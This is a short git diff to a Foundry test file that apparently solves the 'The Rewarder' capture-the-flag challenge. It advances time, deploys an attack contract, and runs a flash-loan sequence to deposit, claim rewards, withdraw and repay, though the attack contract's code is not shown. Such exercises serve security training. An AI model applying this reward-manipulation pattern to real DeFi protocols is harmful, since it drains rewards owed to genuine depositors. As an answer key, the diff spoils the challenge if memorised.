@@ -148,7 +148,18 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Advance time to trigger a new rewards round
+        vm.warp(block.timestamp + 5 days);
+    
+        // Deploy attacker contract
+        AttackContract attackerContract = new AttackContract(
+            flashLoanPool,
+            rewarderPool,
+            liquidityToken
+        );
+    
+        // Execute flash loan to deposit, claim rewards, withdraw, repay
+        attackerContract.attack(TOKENS_IN_LENDER_POOL);
     }
 
     /**
